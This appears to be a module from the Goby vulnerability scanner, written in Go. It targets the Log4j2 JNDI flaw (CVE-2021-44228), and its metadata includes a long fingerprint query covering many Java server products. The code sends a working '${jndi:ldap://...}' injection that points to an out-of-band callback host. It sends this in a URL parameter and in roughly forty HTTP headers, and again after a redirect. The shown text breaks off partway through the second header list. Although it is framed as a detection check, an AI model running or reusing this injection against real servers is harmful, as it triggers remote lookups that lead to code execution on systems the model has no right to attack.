package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Log4j2 JNDI RCE vulnerability(HTTP header fuzz)(CVE-2021-44228)",
    "Description": "<p>Apache Log4j2 is a Java-based logging tool. This tool rewrites the Log4j framework and introduces a lot of rich features. The log framework is widely used in business system development to record log information.</p><p>Apache Log4j 2.x </p>",
    "Impact": "Apache Log4j2 JNDI RCE vulnerability(HTTP header fuzz)(CVE-2021-44228)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://logging.apache.org/log4j/2.x/security.html\">https://logging.apache.org/log4j/2.x/security.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Log4j2",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Log4j2 JNDI 命令执行漏洞（HTTP 头 FUZZ）（CVE-2021-44228）",
            "Description": "<p>Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。<br></p><p><span style=\"font-size: 16px;\"><span style=\"font-size: 16px;\">Apache Log4j 2.x &lt; 2.16.0-rc1</span> 存在 jndi 注入漏洞。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。（此 poc 通过 fuzz HTTP 头来检测这个漏洞。）</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Apache Log4j 2.x &lt; 2.16.0-rc1</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">&nbsp;存在 jndi 注入漏洞。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。</span><br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://logging.apache.org/log4j/2.x/security.html\">https://logging.apache.org/log4j/2.x/security.html</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Log4j2",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache Log4j2 JNDI RCE vulnerability(HTTP header fuzz)(CVE-2021-44228)",
            "Description": "<p>Apache Log4j2 is a Java-based logging tool. This tool rewrites the Log4j framework and introduces a lot of rich features. The log framework is widely used in business system development to record log information.</p><p>Apache Log4j 2.x < 2.16.0-rc1 has jndi injection vulnerability. In most cases, developers may write error messages caused by user input into the log. Attackers can use this feature to construct special data request packets through this vulnerability, and ultimately trigger remote code execution.(This poc detects this vulnerability by fuzzing HTTP headers.)</p>",
            "Impact": "Apache Log4j2 JNDI RCE vulnerability(HTTP header fuzz)(CVE-2021-44228)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://logging.apache.org/log4j/2.x/security.html\">https://logging.apache.org/log4j/2.x/security.html</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Log4j2",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "((title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\")) || (header=\"mapreduce\" || body=\"an HTTP request to a Hadoop IPC port\" || banner=\"Name: mapreduce\") || (title==\"SkyWalking\") || (body=\"</i> Shiro</li>\" || header=\"shiro-cas\" || banner=\"shiro-cas\" || header=\"rememberme=deleteMe\" || title=\"Apache Shiro Quickstart\") || (title=\"Powered by JEECMS\") || (((body=\"jeesite.css\" || body=\"jeesite.js\") && body=\"jeesite.com\") || header=\"Set-Cookie: jeesite.session.id=\" || banner=\"Set-Cookie: jeesite.session.id=\") || (header=\" Basic realm=\\\"dubbo\\\"\" || banner=\"Basic realm=\\\"dubbo\\\"\" || title==\"Dubbo\" || banner=\"Unsupported command: GET\" || protocol=\"apache-dubbo\") || (title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\") || (body=\"name=\\\"author\\\" content=\\\"http://www.jeeplus.org/\" || body=\"<meta name=\\\"author\\\" content=\\\"jeeplus\\\">\" || title=\"Jeeplus vue快速开发平台\" || (body=\"jeeplus.js\" && body=\"/static/common/\") || title=\"JeePlus 快速开发平台\") || (body=\"<li><i class=\\\"fa fa-arrow-circle-o-right m-r-xs\\\"></i> Mybatis</li>\" || (header=\"X-Application-Context\" && header=\"include-mybatis:\") || (banner=\"X-Application-Context\" && banner=\"include-mybatis:\")) || (((header=\"Server: Netty@SpringBoot\" || body=\"Whitelabel Error Page\") && body!=\"couchdb\")) || (((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\") || (cert=\"Organizational Unit: Apache OFBiz\") || ((header=\"X-Jenkins\" && header!=\"couchdb\" && header!=\"X-Generator: Drupal\") || header=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || (banner=\"X-Jenkins\" && banner!=\"28ze\" && banner!=\"couchdb\" && banner!=\"X-Generator: Drupal\") || (banner=\"X-Hudson\" && banner!=\"couchdb\") || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || (body=\"Jenkins-Agent-Protocols\" && header=\"Content-Type: text/plain\")) || (title=\"RabbitMQ Management\" || banner=\"server:RabbitMQ\") || (header=\"testBanCookie\" || banner=\"testBanCookie\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\")) || (title=\"FE协作\" || (body=\"V_show\" && body=\"V_hedden\")) || (body=\"content=\\\"Weaver E-mobile\\\"\" || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\")) || (body=\"szFeatures\" && body=\"redirectUrl\") || (title=\"用友新世纪\" && body!=\"couchdb\") || (title=\"用友GRP-U8\") || ((body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")) || (body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\") || (banner=\"/Jeewms/\" && banner=\"Location\") || (title=\"Hue - Welcome to Hue\" || body=\"id=\\\"jHueNotify\") || (body=\"/static/yarn.css\" || body=\"yarn.dt.plugins.js\") || (body=\"<b>HttpFs service</b\") || (title=\"E-Business Suite Home Page Redirect\") || ((header=\"Server: Splunkd\" && body!=\"Server: couchdb\" && header!=\"drupal\") || (banner=\"Server: Splunkd\" && banner!=\"couchdb\" && banner!=\"drupal\") || (body=\"Splunk.util.normalizeBoolean\" && body!=\"Server: couchdb\" && header!=\"drupal\")) || (title=\"ID_Converter_Welcome\") || (title=\"Storm UI\") || ((banner=\"nccloud\" && banner=\"Location\" && banner=\"JSESSIONID\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\") || (title==\"Apache Druid\") || (header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || body=\"<h1>Whitelabel Error Page</h1>\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\") || ((banner=\"JavaMelody\" && banner=\"X-Application-Context\") || (header=\"JavaMelody\" && header=\"X-Application-Context\")) || (header=\"/opennms/login.jsp\" || banner=\"/opennms/login.jsp\" || body=\"OpenNMS? is a registered trademark of\" || title=\"opennms web console\" || body=\"/opennms/index.jsp\") || (cert=\"Apache Unomi\") || ((header=\"Server: Jetty\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"Server: Jetty\" && banner!=\"couchdb\" && banner!=\"drupal\")) || ((header=\"application/json\" && body=\"build_hash\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\") || (((title=\"Welcome to JBoss\" && title!=\"Welcome to JBoss AS\") && header!=\"JBoss-EAP\" && header!=\"couchdb\" && header!=\"drupal\" && header!=\"ReeCam IP Camera\") || (server=\"JBoss\" && header!=\"couchdb\" && header!=\"Routers\" && header!=\"X-Generator: Drupal\" && body!=\"28ze\" && header!=\"ReeCam IP Camera\") || (banner=\"server: JBoss\" && banner!=\"server: JBoss-EAP\" && banner!=\"couchdb\")) || (body=\"background: transparent url(images/login_logo.gif) no-repeat\" || title=\"Openfire Admin Console\" || title=\"Openfire HTTP Binding Service\") || (((server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (title==\"Error 404--Not Found\") || (title=\"Oracle BI Publisher Enterprise\") || (title=\"vSphere Web Client\") || (((body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss AS\" || header=\"JBossAS\") && header!=\"couchdb\" && header!=\"ReeCam IP Camera\" && body!=\"couchdb\") || (banner=\"JBossAS\" && banner!=\"couchdb\" && banner!=\"ReeCam IP Camera\")) || (body=\"sheight*window.screen.deviceYDPI\") || (body=\"CAS &#8211; Central Authentication Service\") || (cert=\"BMC Control-M Root CA\" || title=\"Control-M Welcome Page\") || (banner=\"JAMES SMTP Server\" || banner=\"JAMES POP3 Server\" || banner=\"Apache JAMES awesome SMTP Server\" || banner=\"Email Server (Apache JAMES)\") || (body=\"css/ubnt-icon\" || (body=\"/static/js/uv3.f52e5bd5bc905aef1f095e4e2c1299b3c2bae675.min.js\" && body=\"NVR\") || (cert=\"CommonName: UniFi-Video Controller\" && cert=\"Organizational Unit: R&D\")) || (body=\"j_spring_security_check\" && body=\"MobileIron\") || (title==\"CloudCenter Suite\" || (cert=\"CommonName: ccs.cisco.com\" && cert=\"Organization: Cisco Systems, Inc.\")) || (title=\"UniFi Network\") || (title=\"VMware HCX\" || (cert=\"CommonName: hcx.local\" && cert=\"Organization: VMware\") || (banner=\"/hybridity/ui/hcx-client/index.html\" && banner=\"Location\")) || (title=\"VMware Horizon\" || body=\"href='https://www.vmware.com/go/viewclients'\" || body=\"alt=\\\"VMware Horizon\\\">\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"vSphere Web Client\") || (title=\"vRealize Operations Tenant App\") || (cert=\"codebuild\" && cert=\"Organization: Amazon\") || (banner=\"Location: /workspaceone/index.html\" || (banner=\"Location: /SAAS/apps/\" && banner=\"Content-Length: 0\") || (title=\"Workspace ONE Access\" && (body=\"content=\\\"VMware, Inc.\" || body=\"<div class=\\\"admin-header-org\\\">Workspace ONE Access</div>\")) || title=\"VMware Workspace ONE? Assist\") || (title=\"VMware Identity Manager\" || (body=\"/cfg/help/getHelpLink\" && body=\"<h2>VMware Identity Manager Portal\")) || (title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\") || ((body=\"content=\\\"OpenCms\" || body=\"Powered by OpenCms\") && body!=\"Couchdb\") || (body=\"section-Main-WelcomeToApacheJSPWiki\" || (body=\"/scripts/jspwiki-common.js\" && body=\"jspwiki_print.css\")) || (body=\"<base href=\\\"/zipkin/\\\">\" || (banner=\"location: /zipkin/\" && banner=\"Armeria\") || (banner=\"Location: ./zipkin/\" && banner=\"Content-Length: 0\")) || (cert=\"CodePipeline\" && cert=\"Organization: Amazon\") || (title=\"vRealize Operations Manager\" || banner=\"VMware vRealize Operations\") || (header=\"Server: VMware Horizon DaaS\" || title=\"VMware Horizon DaaS\" || banner=\"Server: VMware Horizon DaaS\" || (cert=\"Organization: VMware\" && cert=\"CommonName: DaaS\")) || (cert=\"quicksight\" && cert=\"Organization: Amazon\") || (cert=\"Apache Unomi\" || (title=\"Apache Unomi Welcome Page\" && body=\"Logo Apache Unomi\")) || (title=\"Index - Elasticsearch Engineer\") || (title==\"VMware Carbon Black EDR\" && body=\"versionNumber\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"TamronOS IPTV系统\") || (cert=\"greengrass\" && cert=\"Organization: Amazon\") || (title==\"Tanzu Observability\") || (title=\"vRealize Log Insight\" || banner=\"VMware vRealize Log Insight\") || ((banner=\"/core/api/Console/Session\" && banner=\"Location\") || (header=\"/core/api/Console/Session\" && header=\"Location\") || (cert=\"CommonName: openmanage1\" && cert=\"Organization: Dell Inc.\") || (body=\"url: '/core/api/Console/Configuration'\" && body=\"/topic/messages\"))) || header=\"Apache-Coyote\" || header=\"JSESSIONID\" || header=\"Apache Tomcat\" || header=\"Jetty\"",
    "GobyQuery": "((title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\")) || (header=\"mapreduce\" || body=\"an HTTP request to a Hadoop IPC port\" || banner=\"Name: mapreduce\") || (title==\"SkyWalking\") || (body=\"</i> Shiro</li>\" || header=\"shiro-cas\" || banner=\"shiro-cas\" || header=\"rememberme=deleteMe\" || title=\"Apache Shiro Quickstart\") || (title=\"Powered by JEECMS\") || (((body=\"jeesite.css\" || body=\"jeesite.js\") && body=\"jeesite.com\") || header=\"Set-Cookie: jeesite.session.id=\" || banner=\"Set-Cookie: jeesite.session.id=\") || (header=\" Basic realm=\\\"dubbo\\\"\" || banner=\"Basic realm=\\\"dubbo\\\"\" || title==\"Dubbo\" || banner=\"Unsupported command: GET\" || protocol=\"apache-dubbo\") || (title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\") || (body=\"name=\\\"author\\\" content=\\\"http://www.jeeplus.org/\" || body=\"<meta name=\\\"author\\\" content=\\\"jeeplus\\\">\" || title=\"Jeeplus vue快速开发平台\" || (body=\"jeeplus.js\" && body=\"/static/common/\") || title=\"JeePlus 快速开发平台\") || (body=\"<li><i class=\\\"fa fa-arrow-circle-o-right m-r-xs\\\"></i> Mybatis</li>\" || (header=\"X-Application-Context\" && header=\"include-mybatis:\") || (banner=\"X-Application-Context\" && banner=\"include-mybatis:\")) || (((header=\"Server: Netty@SpringBoot\" || body=\"Whitelabel Error Page\") && body!=\"couchdb\")) || (((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\") || (cert=\"Organizational Unit: Apache OFBiz\") || ((header=\"X-Jenkins\" && header!=\"couchdb\" && header!=\"X-Generator: Drupal\") || header=\"X-Hudson\" || header=\"X-Required-Permission: hudson.model.Hudson.Read\" || (banner=\"X-Jenkins\" && banner!=\"28ze\" && banner!=\"couchdb\" && banner!=\"X-Generator: Drupal\") || (banner=\"X-Hudson\" && banner!=\"couchdb\") || banner=\"X-Required-Permission: hudson.model.Hudson.Read\" || (body=\"Jenkins-Agent-Protocols\" && header=\"Content-Type: text/plain\")) || (title=\"RabbitMQ Management\" || banner=\"server:RabbitMQ\") || (header=\"testBanCookie\" || banner=\"testBanCookie\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\")) || (title=\"FE协作\" || (body=\"V_show\" && body=\"V_hedden\")) || (body=\"content=\\\"Weaver E-mobile\\\"\" || body=\"/images/login_logo@2x.png\" || (body=\"window.apiprifix = \\\"/emp\\\";\" && title=\"移动管理平台\")) || (body=\"szFeatures\" && body=\"redirectUrl\") || (title=\"用友新世纪\" && body!=\"couchdb\") || (title=\"用友GRP-U8\") || ((body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")) || (body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || (body=\"/yyoa/\" && body!=\"本站内容均采集于\") || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\") || banner=\"Server: SY8044\") || (banner=\"/Jeewms/\" && banner=\"Location\") || (title=\"Hue - Welcome to Hue\" || body=\"id=\\\"jHueNotify\") || (body=\"/static/yarn.css\" || body=\"yarn.dt.plugins.js\") || (body=\"<b>HttpFs service</b\") || (title=\"E-Business Suite Home Page Redirect\") || ((header=\"Server: Splunkd\" && body!=\"Server: couchdb\" && header!=\"drupal\") || (banner=\"Server: Splunkd\" && banner!=\"couchdb\" && banner!=\"drupal\") || (body=\"Splunk.util.normalizeBoolean\" && body!=\"Server: couchdb\" && header!=\"drupal\")) || (title=\"ID_Converter_Welcome\") || (title=\"Storm UI\") || ((banner=\"nccloud\" && banner=\"Location\" && banner=\"JSESSIONID\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\") || (title==\"Apache Druid\") || (header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || body=\"<h1>Whitelabel Error Page</h1>\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\") || ((banner=\"JavaMelody\" && banner=\"X-Application-Context\") || (header=\"JavaMelody\" && header=\"X-Application-Context\")) || (header=\"/opennms/login.jsp\" || banner=\"/opennms/login.jsp\" || body=\"OpenNMS? is a registered trademark of\" || title=\"opennms web console\" || body=\"/opennms/index.jsp\") || (cert=\"Apache Unomi\") || ((header=\"Server: Jetty\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"Server: Jetty\" && banner!=\"couchdb\" && banner!=\"drupal\")) || ((header=\"application/json\" && body=\"build_hash\") || protocol=\"elastic\" || header=\"realm=\\\"ElasticSearch\" || banner=\"realm=\\\"ElasticSearch\") || (((title=\"Welcome to JBoss\" && title!=\"Welcome to JBoss AS\") && header!=\"JBoss-EAP\" && header!=\"couchdb\" && header!=\"drupal\" && header!=\"ReeCam IP Camera\") || (server=\"JBoss\" && header!=\"couchdb\" && header!=\"Routers\" && header!=\"X-Generator: Drupal\" && body!=\"28ze\" && header!=\"ReeCam IP Camera\") || (banner=\"server: JBoss\" && banner!=\"server: JBoss-EAP\" && banner!=\"couchdb\")) || (body=\"background: transparent url(images/login_logo.gif) no-repeat\" || title=\"Openfire Admin Console\" || title=\"Openfire HTTP Binding Service\") || (((server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (title==\"Error 404--Not Found\") || (title=\"Oracle BI Publisher Enterprise\") || (title=\"vSphere Web Client\") || (((body=\"Manage this JBoss AS Instance\" || title=\"Welcome to JBoss AS\" || header=\"JBossAS\") && header!=\"couchdb\" && header!=\"ReeCam IP Camera\" && body!=\"couchdb\") || (banner=\"JBossAS\" && banner!=\"couchdb\" && banner!=\"ReeCam IP Camera\")) || (body=\"sheight*window.screen.deviceYDPI\") || (body=\"CAS &#8211; Central Authentication Service\") || (cert=\"BMC Control-M Root CA\" || title=\"Control-M Welcome Page\") || (banner=\"JAMES SMTP Server\" || banner=\"JAMES POP3 Server\" || banner=\"Apache JAMES awesome SMTP Server\" || banner=\"Email Server (Apache JAMES)\") || (body=\"css/ubnt-icon\" || (body=\"/static/js/uv3.f52e5bd5bc905aef1f095e4e2c1299b3c2bae675.min.js\" && body=\"NVR\") || (cert=\"CommonName: UniFi-Video Controller\" && cert=\"Organizational Unit: R&D\")) || (body=\"j_spring_security_check\" && body=\"MobileIron\") || (title==\"CloudCenter Suite\" || (cert=\"CommonName: ccs.cisco.com\" && cert=\"Organization: Cisco Systems, Inc.\")) || (title=\"UniFi Network\") || (title=\"VMware HCX\" || (cert=\"CommonName: hcx.local\" && cert=\"Organization: VMware\") || (banner=\"/hybridity/ui/hcx-client/index.html\" && banner=\"Location\")) || (title=\"VMware Horizon\" || body=\"href='https://www.vmware.com/go/viewclients'\" || body=\"alt=\\\"VMware Horizon\\\">\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"vSphere Web Client\") || (title=\"vRealize Operations Tenant App\") || (cert=\"codebuild\" && cert=\"Organization: Amazon\") || (banner=\"Location: /workspaceone/index.html\" || (banner=\"Location: /SAAS/apps/\" && banner=\"Content-Length: 0\") || (title=\"Workspace ONE Access\" && (body=\"content=\\\"VMware, Inc.\" || body=\"<div class=\\\"admin-header-org\\\">Workspace ONE Access</div>\")) || title=\"VMware Workspace ONE? Assist\") || (title=\"VMware Identity Manager\" || (body=\"/cfg/help/getHelpLink\" && body=\"<h2>VMware Identity Manager Portal\")) || (title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\") || ((body=\"content=\\\"OpenCms\" || body=\"Powered by OpenCms\") && body!=\"Couchdb\") || (body=\"section-Main-WelcomeToApacheJSPWiki\" || (body=\"/scripts/jspwiki-common.js\" && body=\"jspwiki_print.css\")) || (body=\"<base href=\\\"/zipkin/\\\">\" || (banner=\"location: /zipkin/\" && banner=\"Armeria\") || (banner=\"Location: ./zipkin/\" && banner=\"Content-Length: 0\")) || (cert=\"CodePipeline\" && cert=\"Organization: Amazon\") || (title=\"vRealize Operations Manager\" || banner=\"VMware vRealize Operations\") || (header=\"Server: VMware Horizon DaaS\" || title=\"VMware Horizon DaaS\" || banner=\"Server: VMware Horizon DaaS\" || (cert=\"Organization: VMware\" && cert=\"CommonName: DaaS\")) || (cert=\"quicksight\" && cert=\"Organization: Amazon\") || (cert=\"Apache Unomi\" || (title=\"Apache Unomi Welcome Page\" && body=\"Logo Apache Unomi\")) || (title=\"Index - Elasticsearch Engineer\") || (title==\"VMware Carbon Black EDR\" && body=\"versionNumber\") || (title=\"VMware NSX\" || (header=\"Server: NSX\" && header!=\"Server: NSX LB\") || body=\"/VMW_NSX_Logo-Black-Triangle-500w.png\" || (banner=\"Server: NSX\" && banner!=\"Server: NSX LB\")) || (title=\"TamronOS IPTV系统\") || (cert=\"greengrass\" && cert=\"Organization: Amazon\") || (title==\"Tanzu Observability\") || (title=\"vRealize Log Insight\" || banner=\"VMware vRealize Log Insight\") || ((banner=\"/core/api/Console/Session\" && banner=\"Location\") || (header=\"/core/api/Console/Session\" && header=\"Location\") || (cert=\"CommonName: openmanage1\" && cert=\"Organization: Dell Inc.\") || (body=\"url: '/core/api/Console/Configuration'\" && body=\"/topic/messages\"))) || header=\"Apache-Coyote\" || header=\"JSESSIONID\" || header=\"Apache Tomcat\" || header=\"Jetty\"",
    "Author": "keeeee",
    "Homepage": "https://logging.apache.org/log4j/2.x/",
    "DisclosureDate": "2021-12-17",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6855"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri := "/?getData=" + url.QueryEscape(cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("X-Api-Version", cmd)
			cfg.Header.Store("X-Forwarded-For", cmd)
			cfg.Header.Store("If-Modified-Since", cmd)
			cfg.Header.Store("User-Agent", cmd)
			cfg.Header.Store("Cookie", cmd)
			cfg.Header.Store("Refer", cmd)
			cfg.Header.Store("Accept-Language", cmd)
			cfg.Header.Store("Accept-Encoding", cmd)
			cfg.Header.Store("Upgrade-insecure-requests", cmd)
			cfg.Header.Store("Accept", cmd)
			cfg.Header.Store("upgrade-insecure-requests", cmd)
			cfg.Header.Store("Origin", cmd)
			cfg.Header.Store("Pragma", cmd)
			cfg.Header.Store("X-Requested-With", cmd)
			cfg.Header.Store("X-CSRF-Token", cmd)
			cfg.Header.Store("Dnt", cmd)
			cfg.Header.Store("Content-Length", cmd)
			cfg.Header.Store("Access-Control-Request-Method", cmd)
			cfg.Header.Store("Access-Control-Request-Method", cmd)
			cfg.Header.Store("Warning", cmd)
			cfg.Header.Store("Authorization", cmd)
			cfg.Header.Store("TE", cmd)
			cfg.Header.Store("Accept-Charset", cmd)
			cfg.Header.Store("Accept-Datetime", cmd)
			cfg.Header.Store("Date", cmd)
			cfg.Header.Store("Forwarded", cmd)
			cfg.Header.Store("From", cmd)
			cfg.Header.Store("Max-Forwards", cmd)
			cfg.Header.Store("Proxy-Authorization", cmd)
			cfg.Header.Store("Range", cmd)
			cfg.Header.Store("Content-Disposition", cmd)
			cfg.Header.Store("Content-Encoding", cmd)
			cfg.Header.Store("X-Amz-Target", cmd)
			cfg.Header.Store("X-Amz-Date", cmd)
			cfg.Header.Store("Username", cmd)
			cfg.Header.Store("IP", cmd)
			cfg.Header.Store("IPaddress", cmd)
			cfg.Header.Store("Hostname", cmd)
			cfg.Header.Store("X-CSRFToken", cmd)
			cfg.Header.Store("X-XSRF-TOKEN", cmd)
			cfg.Header.Store("X-ProxyUser-Ip", cmd)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 302 {
					lastUrl := resp.Header.Get("Location")
					cfg = httpclient.NewGetRequestConfig(lastUrl + "?getData=" + url.QueryEscape(cmd))
					cfg.VerifyTls = false
					cfg.FollowRedirect = false
					cfg.Header.Store("X-Api-Version", cmd)
					cfg.Header.Store("User-Agent", cmd)
					cfg.Header.Store("Cookie", cmd)
					cfg.Header.Store("Refer", cmd)
					cfg.Header.Store("Accept-Language", cmd)
					cfg.Header.Store("Accept-Encoding", cmd)
					cfg.Header.Store("Upgrade-insecure-requests", cmd)
					cfg.Header.Store("Accept", cmd)
					cfg.Header.Store("upgrade-insecure-requests", cmd)
					cfg.Header.Store("X-Forwarded-For", cmd)
					cfg.Header.Store("If-Modified-Since", cmd)
					cfg.Header.Store("Origin", cmd)
					cfg.Header.Store("Pragma", cmd)
